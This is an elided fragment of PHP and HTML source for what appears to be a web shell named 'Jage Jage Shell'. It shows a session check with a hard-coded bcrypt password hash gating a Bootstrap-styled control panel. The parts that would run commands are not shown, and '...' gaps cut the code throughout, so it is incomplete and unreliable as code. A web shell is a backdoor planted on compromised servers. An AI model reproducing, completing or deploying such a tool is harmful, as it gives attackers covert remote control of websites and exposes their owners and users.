...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$JnBvvtBny4trm/kY40xqHeYyGsvO1j9RonD6C7.jnkJdcHY5GSw/.'; 
	...
	<div class="container-lg">
		...
		<div class="row">
			...
			<div class="col-md-12 my-3">
				<div class="card border-dark">
					<div class="card-body">
							<center><a href=""><font color="red"size="3"><b>Jage Jage Shell</b></font></a><center/><span class="float-end"><span class="text-muted"></span></span>
					</div>
				</div>
			</div>
		</div>
